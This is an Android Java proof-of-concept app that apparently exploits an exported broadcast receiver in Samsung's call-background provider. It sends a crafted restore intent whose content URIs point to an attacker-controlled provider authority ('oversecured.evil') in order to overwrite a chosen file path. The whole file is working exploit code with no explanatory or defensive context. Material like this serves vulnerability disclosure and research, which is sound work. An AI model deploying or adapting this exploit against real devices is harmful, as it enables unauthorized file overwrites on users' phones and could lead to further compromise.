package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String overwriteLocation = "/sdcard/1337";

        Intent i = new Intent("com.samsung.android.intent.action.REQUEST_RESTORE_CALLBACKGROUND");
        i.setClassName("com.samsung.android.callbgprovider", "com.samsung.android.callbgprovider.bnr.CallBackgroungSmartSwitchReceiver");
        i.putExtra("SAVE_PATH", "not_empty");
        i.putExtra("SOURCE", "not_empty");
        i.putExtra("SESSION_KEY", "not_empty");
        i.putExtra("SAVE_PATH_URIS", new ArrayList<>(Arrays.asList("content://oversecured.evil/document/xyzxyz",
                "content://oversecured.evil/document/" + Uri.encode(overwriteLocation))));
        sendBroadcast(i);
    }
}